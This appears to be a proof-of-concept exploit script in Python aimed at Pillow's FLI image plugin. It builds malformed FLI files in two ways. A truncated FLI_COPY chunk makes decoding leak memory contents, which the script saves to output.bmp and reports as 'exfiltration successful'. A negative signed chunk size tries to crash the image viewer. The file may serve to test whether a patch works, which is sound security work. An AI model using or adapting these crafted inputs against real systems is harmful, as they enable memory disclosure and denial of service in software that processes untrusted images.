import io
from struct import Struct
from typing import List, Tuple

from PIL import FliImagePlugin as FIP

chunk_size_override = 0

fli_format = Struct("<I2sHHHHHI2x4x4x4x4x2x2x2x2x2x4x2x2x24x4x4x40x")
frame_format = Struct("<I2sH2x2x2x2x")
chunk_format = Struct("<iH")


def fli_frame(chunks: List[Tuple[int, bytes]]):
    chunk_data = b''.join(map(fli_chunk, chunks))
    return frame_format.pack(len(chunk_data) + frame_format.size, b'\xFA\xF1', len(chunks)) + chunk_data


def fli_chunk(chunk: Tuple[int, bytes]) -> bytes:
    global chunk_size_override
    chunk_type, data = chunk
    while len(data) < 10 - chunk_format.size or len(data) % 2 == 1:
        data += b'\x00'
    return chunk_format.pack(len(data) + chunk_format.size + chunk_size_override, chunk_type) + data


def fli_image(width: int, height: int, chunks: List[Tuple[int, bytes]]):
    frame_data = fli_frame(chunks)
    return fli_format.pack(len(frame_data) + fli_format.size, b'\x12\xAF', 1, width, height, 8, 3, 40) + frame_data


# exploit FLI_COPY
fli_data = fli_image(100, 100, [(16, b'\x01\x01')])
img = FIP.FliImageFile(io.BytesIO(fli_data))

try:
    data = img.tobytes()
except:
    print("exfiltration stopped")
else:
    with open("output.bmp", "wb") as file:
        file.write(data)
    print("exfiltration successful")

# exploit signed chunk size
chunk_size_override = -100_000_000
fli_data = fli_image(1, 1, [(16, b'\x01\x01'), (16, b'\x01\x01')])
img = FIP.FliImageFile(io.BytesIO(fli_data))

print("Crash on next line?")
img.show()
print("Crash avoided")
